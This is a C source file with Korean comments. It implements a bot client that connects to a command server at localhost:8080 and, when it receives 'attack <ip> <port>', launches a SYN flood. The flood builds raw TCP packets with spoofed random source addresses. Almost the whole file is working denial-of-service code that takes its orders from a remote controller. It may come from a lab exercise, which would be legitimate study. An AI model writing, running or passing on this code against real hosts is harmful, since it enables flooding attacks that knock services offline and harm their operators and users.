//cammand ex) attack 127.0.0.1 80

#include <stdio.h>
#include <stdatomic.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <sys/time.h>

#define BUF 1024
#define SERVER_IP   "127.0.0.1"
#define SERVER_PORT 8080

static _Atomic int running = 1;

// ─────────────────────────────────────────────
// [1] 체크섬 계산
// ─────────────────────────────────────────────
unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    unsigned short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    return answer;
}

// ─────────────────────────────────────────────
// [2] 랜덤 IP 생성
// ─────────────────────────────────────────────
unsigned int get_random_uint() {
    unsigned int r;
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd < 0 || read(fd, &r, sizeof(r)) != sizeof(r)) {
        perror("urandom error");
        exit(1);
    }
    close(fd);
    return r;
}

// ─────────────────────────────────────────────
// [3] SYN Flood 공격 함수
// ─────────────────────────────────────────────
void tcp_syn_flood(const char *target_ip, int target_port) {
    printf("[*] SYN Flood 시작: %s:%d\n", target_ip, target_port);
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) { perror("raw socket"); return; }

    char datagram[4096];
    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    int one = 1;
    const int *val = &one;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));

    int count = 0;
    while (running && count < 1000) {
        memset(datagram, 0, 4096);
        uint32_t source_ip = get_random_uint();

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->id = htons(get_random_uint() % 65535);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = checksum((unsigned short *) datagram, sizeof(struct iphdr) + sizeof(struct tcphdr));

        tcph->source = htons(get_random_uint() % 65535);
        tcph->dest = htons(target_port);
        tcph->seq = htonl(get_random_uint());
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(1024);
        tcph->check = 0;

        struct pseudo_header {
            u_int32_t source_address;
            u_int32_t dest_address;
            u_int8_t placeholder;
            u_int8_t protocol;
            u_int16_t tcp_length;
        };

        struct pseudo_header psh;
        psh.source_address = source_ip;
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));

        char pseudo_packet[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
        memcpy(pseudo_packet, &psh, sizeof(psh));
        memcpy(pseudo_packet + sizeof(psh), tcph, sizeof(struct tcphdr));
        tcph->check = checksum((unsigned short*)pseudo_packet, sizeof(pseudo_packet));

        if (sendto(s, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
            (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            perror("[ATTACK] sendto failed");
        } else {
            printf("[ATTACK] Sent packet to %s:%d (seq=%u)\n",
                   target_ip, target_port, ntohl(tcph->seq));
            count++;
        }
    }

    printf("[*] SYN Flood 종료, 총 전송 수: %d\n", count);
    close(s);
}

// ─────────────────────────────────────────────
// [4] 수신 스레드: 서버 메시지 수신 및 명령 처리
// ─────────────────────────────────────────────
static void* recv_thread(void* arg) {
    int sock = *(int*)arg;
    char buf[BUF];

    for (;;) {
        if (!running) break;

        ssize_t n = recv(sock, buf, sizeof(buf)-1, 0);
        if (n <= 0) {
            if (n < 0 && (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK)) continue;
            running = 0;
            break;
        }
        buf[n] = '\0';
        printf("[SERVER] %s", buf);
        if (buf[n-1] != '\n') putchar('\n');

        // "attack <ip> <port>" 명령 수신 시 공격 시작
        if (strncmp(buf, "attack", 6) == 0) {
            char ip[100];
            int port;
            if (sscanf(buf, "attack %99s %d", ip, &port) == 2) {
                tcp_syn_flood(ip, port);
            } else {
                printf("[!] 명령 오류: attack <ip> <port> 형식이어야 합니다.\n");
            }
        }
    }
    return NULL;
}

// ─────────────────────────────────────────────
// [5] 메인 함수: 서버 연결 및 사용자 종료 감시
// ─────────────────────────────────────────────
int main(void) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) { perror("socket"); return 1; }

    struct sockaddr_in sa; memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port   = htons(SERVER_PORT);
    if (inet_pton(AF_INET, SERVER_IP, &sa.sin_addr) <= 0) {
        perror("inet_pton"); close(sock); return 1;
    }

    if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) == -1) {
        perror("connect"); close(sock); return 1;
    }

    struct timeval tv = { .tv_sec = 0, .tv_usec = 200000 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    puts("서버에 연결됨. 'q' 입력 시 종료.");
    pthread_t th;
    if (pthread_create(&th, NULL, recv_thread, &sock) != 0) {
        perror("pthread_create"); close(sock); return 1;
    }

    for (;;) {
        int c = getchar();
        if (c == 'q' || c == EOF) {
            running = 0;
            shutdown(sock, SHUT_RDWR);
            break;
        }
    }

    pthread_join(th, NULL);
    close(sock);
    return 0;
}
